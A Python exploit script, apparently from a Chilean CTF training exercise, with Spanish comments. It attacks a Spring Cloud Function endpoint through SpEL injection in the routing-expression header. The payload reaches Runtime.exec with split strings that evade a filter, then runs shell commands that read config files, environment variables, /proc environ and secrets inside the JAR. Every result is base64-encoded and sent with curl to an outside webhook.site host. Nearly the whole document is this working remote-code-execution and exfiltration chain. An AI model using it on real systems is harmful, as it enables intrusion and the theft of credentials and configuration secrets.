#!/usr/bin/env python3
"""
CTF Chile - Bypass del filtro que protege /app
El filtro bloquea "find /app" pero podemos eludirlo
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("[*] Bypaseando filtro de archivos /app...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: https://webhook.site/#!/{UUID}")
print()

def build_payload(cmd):
    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    payload = build_payload(cmd)
    try:
        r = requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": payload,
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )
        print(f"    [+] {tag:35s} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag}: {e}")

# === TÉCNICAS DE BYPASS ===
print("[*] 1. Bypass usando variables de directorio...")
# En lugar de /app directamente, usamos variables
probe("app_via_var", "cd /a*p && ls -la | base64 -w0 | xargs -I X curl -s '%s/app_var?d=X'" % WH)
probe("app_via_pwd", "cd /app && pwd && ls -la | base64 -w0 | xargs -I X curl -s '%s/app_pwd?d=X'" % WH)

print("[*] 2. Bypass usando wildcards...")
probe("props_wildcard", "cat /a*p/*.properties 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/props_wild?d=X'" % WH)
probe("yml_wildcard", "cat /a*p/*.yml /a*p/*.yaml 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/yml_wild?d=X'" % WH)

print("[*] 3. Bypass fragmentando el comando...")
probe("app_ls_frag", "cd / && l""s a""p""p/ | base64 -w0 | xargs -I X curl -s '%s/ls_frag?d=X'" % WH)
probe("props_frag", "cd / && c""at a""p""p/*.properties 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/props_frag?d=X'" % WH)

print("[*] 4. Usando locate/updatedb...")
probe("locate_props", "locate *.properties 2>/dev/null | head -10 | xargs cat 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/locate_props?d=X'" % WH)
probe("locate_yml", "locate *.yml 2>/dev/null | head -10 | xargs cat 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/locate_yml?d=X'" % WH)

print("[*] 5. Método directo - listar archivos conocidos...")
probe("app_jar", "cd /app && ls -la app.jar | base64 -w0 | xargs -I X curl -s '%s/app_jar?d=X'" % WH)
probe("app_direct", "ls -la /app/ | base64 -w0 | xargs -I X curl -s '%s/app_direct?d=X'" % WH)

print("[*] 6. Archivos de configuración específicos de Spring Boot...")
probe("application_props", "cat /app/application.properties 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/app_props?d=X'" % WH)
probe("application_yml", "cat /app/application.yml /app/application.yaml 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/app_yml?d=X'" % WH)
probe("bootstrap_props", "cat /app/bootstrap.properties 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/bootstrap?d=X'" % WH)

print("[*] 7. Variables de entorno de Spring Boot (pueden tener flags)...")
probe("spring_env", "env | grep SPRING | base64 -w0 | xargs -I X curl -s '%s/spring_env?d=X'" % WH)
probe("java_opts", "env | grep JAVA | base64 -w0 | xargs -I X curl -s '%s/java_env?d=X'" % WH)

print("[*] 8. Leer JAR directamente...")
probe("jar_strings", "strings /app/app.jar | grep -E '(flag|secret|password|token|key)' | head -20 | base64 -w0 | xargs -I X curl -s '%s/jar_strings?d=X'" % WH)
probe("jar_grep_flag", "strings /app/app.jar | grep -i flag | base64 -w0 | xargs -I X curl -s '%s/jar_flag?d=X'" % WH)

print("[*] 9. Archivos en directorios relacionados...")
probe("etc_app", "ls -la /etc/app* 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/etc_app?d=X'" % WH)
probe("opt_app", "ls -la /opt/app* 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/opt_app?d=X'" % WH)
probe("usr_app", "ls -la /usr/app* 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/usr_app?d=X'" % WH)

print("[*] 10. Métodos de enumeración alternativos...")
probe("proc_cmdline_java", "grep -r 'spring.profiles' /proc/*/cmdline 2>/dev/null | base64 -w0 | xargs -I X curl -s '%s/proc_spring?d=X'" % WH)
probe("proc_env_java", "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i flag | base64 -w0 | xargs -I X curl -s '%s/proc_env?d=X'" % WH)

print()
print("[*] Esperando 20s...")
time.sleep(20)

print(f"[*] Revisa los resultados en: https://webhook.site/#!/{UUID}")
print("[*] Bypass completado!")
print()
print("Busca especialmente:")
print("- Archivos .properties o .yml con configuración")
print("- Variables de entorno con flags")
print("- Contenido del JAR con strings sensibles")